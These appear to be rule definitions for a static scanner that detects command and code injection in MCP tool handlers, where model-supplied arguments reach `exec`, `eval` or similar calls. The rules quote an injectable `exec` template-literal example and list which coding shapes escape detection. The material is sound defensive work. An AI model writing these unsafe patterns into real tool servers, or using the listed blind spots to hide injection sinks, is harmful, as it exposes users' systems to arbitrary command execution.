rules.limitations: Reads `.ts`, `.tsx`, `.mts` and `.cts` files that carry a tool-call marker (`handleToolCall`, `CallToolRequestSchema`, `setRequestHandler`, `server.tool`, `@tool`, `tools/call`), and `.js`, `.jsx`, `.mjs` and `.cjs` files that call `setRequestHandler(CallToolRequestSchema, ...)` or carry `handleToolCall`, `server.tool` or `@tool`: in JavaScript a client sends `tools/call`, registers handlers of its own with `setRequestHandler` and imports `CallToolRequestSchema` to build a request, so none of these alone makes a tool handler. It reports `exec` or `execSync` whose first argument is a template literal with `${}` or a concatenation written inside the call. A command built into a variable first and then passed as `exec(command)` is not reported, and neither is a JavaScript dispatcher whose only marker is the `tools/call` string, nor a server whose only tool registration is `server.registerTool(`, which is a marker in neither language. A JavaScript file is skipped as a bundle when its name holds `.min.`, or when it is over 10,000 characters and its median non-blank line (the longer of the middle two, for an even number) is over 500 characters long or most of it is lines over 5,000 characters in which `(` and `;` make up at least 1%. So a one-line bundle of 10,000 characters or fewer is read, and a hand-written file most of whose text is one long line of inlined data with `;` in it, such as a stylesheet or an SVG, is skipped, and its findings with it.
rules.remediation: Pass arguments as an argv array to the process API and never as a composed shell string: `execFile('ffmpeg', ['-i', input, '-f', format])` rather than `exec(`ffmpeg -i ${input} -f ${format}`)`, and leave `shell` unset (it defaults to false). Validate the argument against an allowlist of expected values before it reaches the process boundary — for a codec or container format that is a fixed, short list, so an allowlist is exact rather than a filter that has to anticipate every metacharacter.
rules.title: Tool handler passes a model-supplied argument into an OS command

rules.description: An MCP tool handler routes a tool-parameter value through `eval()`, `exec()`, `compile()`, `__import__()`, or SymPy `parse_expr()` without `local_dict`/`global_dict` pinning. This is the architectural class behind CVE-2026-44717 (mcp-calculate-server, v0.3.18 named-pin row `AAK-MCPCALC-CVE-2026-44717-PIN-001`) and generalizes to any single-author MCP server with the same shape — independent of upstream package identity. The Python AST visitor matches functions decorated with `@mcp.tool` / `@server.tool` / `@app.tool` / `@fastmcp.tool` / `@tool` whose body contains an `eval` / `exec` / `compile` / `__import__` / unsafe `parse_expr` call with an argument bound to the function's parameter set.
rules.limitations: Looks inside the body of the decorated function only, at calls to `eval`, `exec`, `compile`, `__import__` or `parse_expr` whose argument is a parameter's bare name. A helper that does the `eval` (`return _evaluate(expression)`) and a transformed argument (`eval(expression.strip())`) are not reported. A Python file over 512 KB is not read.
rules.remediation: Replace `eval(expr)` with `ast.literal_eval(expr)` for trusted-literal inputs, or with SymPy `parse_expr(expr, local_dict={}, global_dict={}, evaluate=True)` plus a strict symbol allow-list for math. Validate input length + char-set before evaluation. The `mcp-calculate-server` 0.1.1 fix is one canonical example of the safer shape.
rules.title: Unsafe eval()/exec()/compile() inside @mcp.tool handler (CVE-2026-44717 class)
